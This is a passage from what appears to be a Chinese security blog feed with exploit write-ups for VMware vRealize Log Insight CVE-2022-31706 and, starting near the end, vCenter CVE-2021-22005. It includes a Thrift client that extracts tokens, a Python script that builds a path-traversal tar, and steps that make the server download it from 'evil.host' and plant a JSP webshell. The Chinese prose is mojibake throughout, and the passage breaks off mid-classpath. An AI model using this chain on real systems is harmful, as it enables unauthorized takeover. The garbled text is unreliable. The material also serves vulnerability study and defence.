class="hljs-keyword">new</span> <span class="hljs-constructor">TSocket(<span class="hljs-string">&quot;192.168.232.200&quot;</span>, 16520)</span>;<br>transport.<span class="hljs-keyword">open</span><span class="hljs-literal">()</span>;<br>TProtocol protocol = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TBinaryProtocol(<span class="hljs-params">transport</span>)</span>;<br>DaemonCommands.Client client = <span class="hljs-keyword">new</span> DaemonCommands.<span class="hljs-constructor">Client(<span class="hljs-params">protocol</span>)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(client.get<span class="hljs-constructor">ClusterCertificate()</span>);;<br>transport.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/14.png"></p><p>å‘ç°æŠ¥é”™<code>Socket is closed by peer</code>ï¼Œæ ¹æ®<a href="https://blog.csdn.net/xiaoyaoxiaozi007/article/details/107323857">https://blog.csdn.net/xiaoyaoxiaozi007/article/details/107323857</a> åŠ ä¸Š<code>TTransport tTransport = new TFramedTransport(transport);</code>è§£å†³äº†ã€‚æˆåŠŸæ‹¿åˆ°getClusterCertificateæ–¹æ³•çš„æ‰§è¡Œè¿”å›ç»“æœ</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/15.png"></p><p>æ¥ç€çœ‹å¦‚ä½•å®ç°RCEï¼Œhorizon3æåˆ°æ—¥å¿—ä¸­downloadã€pakç›¸å…³å†…å®¹ï¼Œç»æ£€ç´¢åç¼–è¯‘åä»£ç å®šä½åˆ°com.vmware.loginsight.daemon.commands.SystemCommands#remotePakDownloadCommand</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/16.png"></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/17.png"></p><p>å¾€ä¸Šå›æº¯åˆ°com.vmware.loginsight.daemon.DaemonCommandsHandler#requestCommandä¸­æœ‰è°ƒç”¨ï¼Œè€Œæ­¤æ–¹æ³•åœ¨thrift clientå¯ä»¥ç›´æ¥è°ƒç”¨</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/18.png"></p><p>ä¼ å…¥çš„å‚æ•°ç±»å‹æ˜¯com.vmware.loginsight.daemon.protocol.commands.RemotePakDownloadCommandï¼Œéœ€è¦è®¾ç½®å±æ€§requestUrl(ä¸‹è½½è·¯å¾„)ã€fileName(æœ¬åœ°ä¿å­˜æ–‡ä»¶å)ã€sourceNodeToken(èŠ‚ç‚¹tokenå€¼)ã€‚å…ˆæ£€æŸ¥tokenæ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™ç³»ç»Ÿä»è¿œç«¯æ‹‰å–æ–‡ä»¶ä¿å­˜è‡³&#x2F;tmp&#x2F;ç›®å½•ï¼Œä¸­é—´æœªå¯¹æ–‡ä»¶åŠåœ°å€è¿›è¡Œæ£€æŸ¥</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/19.png"></p><p>é‚£è¿™é‡Œçš„tokenä»å“ªé‡Œå–å‘¢ï¼Œç­”æ¡ˆä¹Ÿæ˜¯é€šè¿‡thrift clientè°ƒç”¨æ–¹æ³•è¿›è¡Œè·å–ã€‚ä»ä¸Šå¾€ä¸‹ä¾æ¬¡æŸ¥çœ‹å¯è·å–ä¿¡æ¯çš„æ–¹æ³•ï¼Œå‘ç°<code>get*</code>æ–¹æ³•å¯ä»¥æ‹¿åˆ°nodeToken</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/20.png"></p><p>æ‹¿åˆ°ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­è°ƒç”¨RemotePakDownloadCommandï¼Œéœ€è¦è®¾ç½®Command#commandTypeã€Command#remotePakDownloadCommandä¸¤ä¸ªå±æ€§å€¼</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/21.png"></p><p>æ ¹æ®å¦‚ä¸Šä¿¡æ¯ï¼Œç¼–å†™thrift clientè°ƒç”¨requestCommandæ–¹æ³•ï¼ŒæˆåŠŸè¯·æ±‚æˆ‘ä»¬ä¼ å…¥çš„å¤–éƒ¨åœ°å€</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/22.png"></p><p>å› ä¸ºæˆ‘ä»¬è¿˜æ²¡åˆ¶ä½œæ»¡è¶³æ ¼å¼è¦æ±‚çš„pakæ–‡ä»¶ï¼Œæ‰€ä»¥æ˜¾ç¤º404ã€‚RemotePakDownloadCommandæ–¹æ³•ä»…ä»…æ˜¯å°†pakæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°&#x2F;tmpç›®å½•ï¼Œè¦å®ŒæˆRCE è¿˜éœ€è¦è§£å‹é‡Šæ”¾æ“ä½œã€‚å†æ¬¡æŸ¥çœ‹thrift clientå¯è°ƒç”¨çš„æ–¹æ³•ä¸­å…³äºpakçš„æ“ä½œï¼Œè¿˜æœ‰ä¸ªcom.vmware.loginsight.daemon.commands.SystemCommands#pakUpgradeCommandæ–¹æ³•ï¼Œè·Ÿè¿›æŸ¥çœ‹ä¸‹ï¼Œè¯¥æ–¹æ³•æ ¹æ®å®¢æˆ·ç«¯ä¼ å…¥å‚æ•°ï¼Œæœ€ç»ˆè°ƒç”¨&#x2F;opt&#x2F;vmware&#x2F;bin&#x2F;loginsight-pak-upgradeè„šæœ¬æ‰§è¡Œè§£å‹æ“ä½œ</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/23.png"></p><p>&#x2F;opt&#x2F;vmware&#x2F;bin&#x2F;loginsight-pak-upgradeåˆè°ƒç”¨äº†&#x2F;usr&#x2F;lib&#x2F;loginsight&#x2F;application&#x2F;sbin&#x2F;loginsight-pak-upgrade.pyè¿›è¡Œå¤„ç†</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/24.png"></p><p>çœ‹è„šæœ¬çš„usageï¼Œç¡®å®æ˜¯å¤„ç†pakæ–‡ä»¶çš„</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/25.png"></p><p>è€Œè¿™é‡Œåˆæ¶‰åŠäº†python tarfile ç¬¬ä¸‰æ–¹åº“çš„ç›®å½•ç©¿è¶Šæ¼æ´ã€‚ç®€å•æ€»ç»“ï¼šCVE-2022-31706 æ¼æ´çš„æœ¬è´¨æ˜¯loginsight-pak-upgrade.pyç›´æ¥è°ƒç”¨tarfileåº“çš„extractall&#x2F;extractæ–¹æ³•æå–æ–‡ä»¶è€Œæœªè¿›è¡Œè¿‡æ»¤æ“ä½œï¼Œè¯¥åº“æ›¾çˆ†å‡ºè¿‡<a href="https://nvd.nist.gov/vuln/detail/CVE-2007-4559">CVE-2007-4559</a>æ¼æ´ï¼šæœªå¯¹æ–‡ä»¶åä¸­çš„..&#x2F;è¿›è¡Œå®‰å…¨é™åˆ¶å¯¼è‡´ææƒtaræ–‡ä»¶æ—¶å¯ä»¥ç›®å½•éå†ã€æ–‡ä»¶è¦†ç›–ã€‚CVE-2022-31706æ¼æ´æ­£æ˜¯åˆ©ç”¨äº†æ­¤â€ç‰¹æ€§â€æœ€ç»ˆå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¦†ç›–ã€åˆ›å»ºwebshellæˆ–Linux cronè®¡åˆ’ä»»åŠ¡ä»¥è·å–ç³»ç»Ÿæƒé™</p><p>è·Ÿä¸‹loginsight-pak-upgrade.pyä»£ç é€»è¾‘ï¼šè„šæœ¬æ ¹æ®ç¨‹åºä¼ å…¥çš„â€“eulaå‚æ•°å†³å®šæ˜¯è¿›å…¥â€œlicenseæ“ä½œâ€ï¼ˆåœˆ1ï¼‰è¿˜æ˜¯è¿›å…¥â€æ‰§è¡Œå‡çº§â€æ“ä½œï¼ˆåœˆ2ã€åœˆ3ï¼‰ã€‚åœ¨â€œlicenseæ“ä½œâ€æµç¨‹ä¸­ï¼Œç³»ç»Ÿåªæå–pakä¸­çš„.mf .cert .txtæ–‡ä»¶ã€‚è€Œåœ¨â€æ‰§è¡Œå‡çº§â€æµç¨‹ä¸­ï¼Œä¼šæå–pakä¸­åŒ…å«çš„æ‰€æœ‰æ–‡ä»¶ï¼Œåè€…ç¬¦åˆæˆ‘ä»¬å¯¹äºæ¼æ´åˆ©ç”¨çš„é¢„æœŸ</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/26.png"></p><p>è§¦å‘ç‚¹åœ¨&#x2F;application&#x2F;sbin&#x2F;loginsight-pak-upgrade.py:378#extractFiles</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/27.png"></p><p>è€Œæƒ³è¦è°ƒç”¨åˆ°extractallæ–¹æ³•éœ€è¦æ»¡è¶³å¦‚ä¸‹4ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªå¯ä»¥é€šè¿‡rpcè°ƒç”¨æ–¹æ³•æ—¶è®¾ç½®eulaOnlyå‚æ•°æ¥æ§åˆ¶ï¼Œè€Œåé¢3ä¸ªéƒ½æ˜¯å¯¹pakæ–‡ä»¶çš„æ ¼å¼è¦æ±‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>ã€mode != MODE<span class="hljs-selector-class">.LICENSE</span><br><span class="hljs-number">2</span>ã€ä¼ å…¥çš„pakåŒ…æ–‡ä»¶è¦æ±‚ï¼š<span class="hljs-built_in">integrityCheck</span>()<br><span class="hljs-number">3</span>ã€ä¼ å…¥å¾—è¯ä¹¦ã€ç­¾åå¯é€šè¿‡æ ¡éªŒï¼š<span class="hljs-built_in">verifyCertificate</span>()ã€<span class="hljs-built_in">validateSignature</span>()ã€<br><span class="hljs-number">4</span>ã€ä¼ å…¥å¾—mfæ–‡ä»¶é€šè¿‡æ ¡éªŒï¼šmanifest<span class="hljs-selector-class">.checkSupportVersion</span>()ã€manifest<span class="hljs-selector-class">.checkDiskSpace</span>() <br></code></pre></td></tr></table></figure><p>ä¾æ¬¡åˆ†æä¸‹æ¡ä»¶ï¼Œ&#x2F;application&#x2F;sbin&#x2F;loginsight-pak-upgrade.py:integrityCheck()å¯¹ä¼ å…¥pakä¸­å¾—æ–‡ä»¶è¿›è¡Œæ ¡éªŒï¼Œéœ€è¦pakåŒ…ä¸­åŒ…å«VMware-vRealize-Log-Insight.mfã€VMware-vRealize-Log-Insight.certã€upgrade-driverã€eula.txtã€*.rpmæ–‡ä»¶ã€‚æŒ¨ä¸ªå¯¹ç…§æ ¼å¼åˆ¶ä½œæ–‡ä»¶æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘åœ¨å®˜ç½‘ç›´æ¥ä¸‹è½½äº†VMware-vRealize-Log-Insight-8.10.2-21145187.pakï¼Œé‡Œé¢å¾—æ–‡ä»¶å°±å¯ä»¥æ»¡è¶³ä¸Šé¢çš„3ä¸ªæ¡ä»¶</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/28.png"></p><p>åœ¨ç³»ç»Ÿä¸­ä¸­éšæ„æ‰¾äº†æ¯”è¾ƒå°çš„rpmæ–‡ä»¶ï¼Œå¤§å°ä¸º100k ä¼ è¾“èµ·æ¥æ–¹ä¾¿ä¸€äº›ï¼Œè¿™æ ·5ä¸ªå¿…éœ€çš„æ–‡ä»¶éƒ½å‡†å¤‡å¥½äº†</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/29.png"></p><p>ä½¿ç”¨tarfileåº“åˆ¶ä½œä¸€ä¸ªevil taræ–‡ä»¶ï¼Œdataæ˜¯æœ€ç»ˆå†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼Œgen.filenameæ˜¯æœ€ç»ˆè¦è¦†ç›–çš„è·¯å¾„ä¿¡æ¯ã€‚è¿è¡Œåä¼šç”Ÿæˆexp.taræ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#genTar.py</span><br><span class="hljs-keyword">import</span> tarfile<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenTarFileTest</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.filename = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">change_name</span>(<span class="hljs-params">self, tarinfo</span>):<br>        tarinfo.name = self.filename<br>        <span class="hljs-keyword">return</span> tarinfo<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.tar&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> tar:<br>            tar.add(name, <span class="hljs-built_in">filter</span>=self.change_name)<br>            tar.add(<span class="hljs-string">&quot;VMware-vRealize-Log-Insight.cert&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;VMware-vRealize-Log-Insight.mf&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;kexec-tools-2.0.3-0.15.18.x86_64.rpm&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;upgrade-driver&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;eula.txt&quot;</span>)<br><br>FilePath = <span class="hljs-string">&quot;/xxx/xxx&quot;</span><br>gen = GenTarFileTest()<br>gen.filename = <span class="hljs-string">&quot;../../../../&quot;</span>+FilePath<br>gen.compress(<span class="hljs-string">&quot;data&quot;</span>)<br><br><br><span class="hljs-comment">#data</span><br>xxx<br></code></pre></td></tr></table></figure><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/30.png"></p><p>ç„¶åä½¿ç”¨ä¸Šé¢æåˆ°çš„rpcæ–¹æ³•RemotePakDownloadCommandï¼ˆåœ°å€ä¸ºevil.host&#x2F;exp.tarï¼‰ã€pakUpgradeCommandæ–¹æ³•(è®¾ç½®eulaOnlyã€fileNameå‚æ•°)å³å¯å®Œæˆåˆ©ç”¨</p><p>jspæ–‡ä»¶ä½ç½®ï¼Œæ‡‚ï¼š</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/31.png"></p><p><strong>çºªå¿µä¸å¥½å…„å¼Ÿèœ—ç‰›å“¥ä¸€èµ·ç†¬å¤œè‚æ´çš„å¤œæ™š</strong></p><h2 id="5ã€æ–‡ç« å‚è€ƒ"><a href="#5ã€æ–‡ç« å‚è€ƒ" class="headerlink" title="5ã€æ–‡ç« å‚è€ƒ"></a>5ã€æ–‡ç« å‚è€ƒ</h2><p><a href="https://www.vmware.com/security/advisories/VMSA-2023-0001.html">https://www.vmware.com/security/advisories/VMSA-2023-0001.html</a></p><p><a href="https://thrift.apache.org/tutorial/java.html">https://thrift.apache.org/tutorial/java.html</a></p><p><a href="https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html">https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html</a></p><p><a href="https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/">https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´è¿½è¸ª</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´åˆ†æ</tag>
      
      <tag>CVE</tag>
      
      <tag>VMware-vRealize-Log-Insight</tag>
      
      <tag>tarfile</tag>
      
      <tag>ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vmware-Vcenteræ¼æ´è¿½è¸ªä¹‹CVE-2021-22005</title>
    <link href="/2022/Research-Vmware-Vcenter&#39;s-vulnerability-CVE-2021-22005/"/>
    <url>/2022/Research-Vmware-Vcenter&#39;s-vulnerability-CVE-2021-22005/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åœ¨CVE-2021-22005 åˆšçˆ†å‡ºæ¥æ—¶ï¼Œtestbnullå¸ˆå‚…åˆ†æäº†æ¼æ´çš„å‰åŠéƒ¨åˆ†ï¼Œä½†æ˜¯æ²¡æœ‰ç»™å‡ºæœ€åçš„RCEæ–¹æ³•ã€‚ç”±äºè‡ªå·±ä¹‹å‰ä¹Ÿåˆ†æè¿‡Vcenterçš„å…¶ä»–å‡ ä¸ªæ´ï¼Œæ‰€ä»¥å½“æ—¶å°±èŠ±äº†äº›æ—¶é—´çœ‹äº†ä¸‹ï¼Œæœ€ç»ˆä½¿ç”¨getAppender()æ‹¿åˆ°å˜é‡æˆåŠŸå®Œæˆäº†RCE EXPçš„æ„é€ ã€‚è€Œååœˆå­é‡Œå¯¹è¯¥æ¼æ´çš„å…³æ³¨åº¦å°äº†å¾ˆå¤šï¼Œä¹Ÿæœ‰äº›å¸ˆå‚…é™†é™†ç»­ç»­å…¬å¼€äº†POC&#x2F;EXPï¼Œç´¢æ€§å°±å°†æˆ‘å½“æ—¶è°ƒè¯•æƒ…å†µåŠåæ¥çš„è¡¥å……åˆ†ææ•´ç†æˆæ–‡ä¸€å¹¶å‘å‡ºæ¥ã€‚å½“æ—¶åˆ†æå®Œåæ„Ÿè§‰ï¼Œå¦‚æœå•çº¯é€šè¿‡å®¡è®¡èƒ½æŒ–å‡ºæ¥è¿™æ´çœŸçš„å¤ªå¼ºäº†ï¼Œè€Œä½¿ç”¨æ”¶é›†æµé‡æ•°æ®+å®¡è®¡ä»£ç å»æ„é€ æ•°æ®åŒ… éš¾åº¦åº”è¯¥ä¼šå°å¾ˆå¤šã€‚åœ¨æµ‹è¯•è¿‡ç¨‹å½“ä¸­æ–­ç‚¹æ”¶åˆ°äº†ç³»ç»Ÿå‘çš„è¯·æ±‚æµé‡ï¼Œæ ¹æ®è¿™äº›ä¹Ÿå¯ä»¥å¾ˆå¿«å®šä½åˆ°æœ€ç»ˆçš„resourceItemToJsonLdMappingå¯¹è±¡è¿›è¡Œæ¨¡æ¿æ³¨å…¥</p></blockquote><p><strong>PSï¼šæœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯è®¨è®ºã€‚ä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ï¼Œè¿è€…åæœè‡ªè´Ÿã€‚</strong></p><h2 id="1ã€ç¯å¢ƒè°ƒè¯•"><a href="#1ã€ç¯å¢ƒè°ƒè¯•" class="headerlink" title="1ã€ç¯å¢ƒè°ƒè¯•"></a>1ã€ç¯å¢ƒè°ƒè¯•</h2><blockquote><p>å¤ç°ç‰ˆæœ¬ï¼šVMware VirtualCenter 6.7.0 build-17028632  linuxå¹³å° </p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/vmware-vmon/</span>svcCfgfiles/analytics.json<br><span class="hljs-string">&quot;-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006&quot;</span>,<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/1.png">  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">é‡å¯æœåŠ¡<br>service-control <span class="hljs-attr">--restart</span> vmware-analytics<br><br>å¼€å¯é˜²ç«å¢™<br>iptables -<span class="hljs-selector-tag">I</span> OUTPUT -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/2.png">  </p><p>æˆåŠŸæ–­ç‚¹è°ƒè¯•ï¼š<br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/3.png">  </p><p>å¦‚æœä¸è¡Œå°±ç›´æ¥ä¸Šå‘½ä»¤å¼€å¯è°ƒè¯•ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>bin<span class="hljs-regexp">/vmware-analytics.launcher -Xmx128m -XX:CompressedClassSpaceSize=64m -Xss256k -XX:ParallelGCThreads=1 -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -Dorg.apache.catalina.startup.EXIT_ON_INIT_FAILURE=TRUE -Danalytics.logDir=/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics -Danalytics.dataDir=/</span>storage<span class="hljs-regexp">/analytics -Danalytics.deploymentNodeTypeFile=/</span>etc<span class="hljs-regexp">/vmware/</span>deployment.node.type -Danalytics.buildInfoFile=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/.buildInfo -Danalytics.agentsDir=/</span>etc<span class="hljs-regexp">/vmware-analytics/</span>agents -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics -XX:ErrorFile=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics<span class="hljs-regexp">/java_error.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintReferenceGC -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=1024K -Xloggc:/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics/</span>vmware-analytics-gc.log -Djava.security.properties=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/java/</span>vmware-override-java.security -Djava.ext.dirs=<span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>lib<span class="hljs-regexp">/ext:/u</span>sr<span class="hljs-regexp">/java/</span>packages<span class="hljs-regexp">/lib/</span>ext:<span class="hljs-regexp">/opt/</span>vmware<span class="hljs-regexp">/jre_ext/</span> -classpath <span class="hljs-regexp">/etc/</span>vmware-analytics:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware-analytics/</span>lib<span class="hljs-regexp">/*:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware-analytics<span class="hljs-regexp">/lib:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>tomcat-embed-core-<span class="hljs-number">8.5</span>.<span class="hljs-number">56</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/tomcat-annotations-api-8.5.56.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>antlr-<span class="hljs-number">2.7</span>.<span class="hljs-number">7</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/antlr-runtime.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>aspectjrt.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/bcprov-jdk16-145.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-codec-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-collections-3.2.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-collections4-<span class="hljs-number">4.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-compress-1.8.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-io-<span class="hljs-number">2.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-lang-2.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-lang3-<span class="hljs-number">3.4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-logging-1.1.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-pool-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/custom-rolling-file-appender-1.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>featureStateSwitch-<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/guava-18.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpasyncclient-<span class="hljs-number">4.1</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpclient-4.5.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpcore-<span class="hljs-number">4.4</span>.<span class="hljs-number">6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpcore-nio-4.4.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpmime-<span class="hljs-number">4.5</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-annotations-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jackson-core-<span class="hljs-number">2.10</span>.<span class="hljs-number">4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-databind-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jna.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-1.2.16.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>log4j-core-<span class="hljs-number">2.8</span>.<span class="hljs-number">2</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-api-2.8.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>platform.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/slf4j-api-1.7.30.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>slf4j-log4j12-<span class="hljs-number">1.7</span>.<span class="hljs-number">30</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-aop-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-beans-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-context-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-core-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-expression-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-web-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span 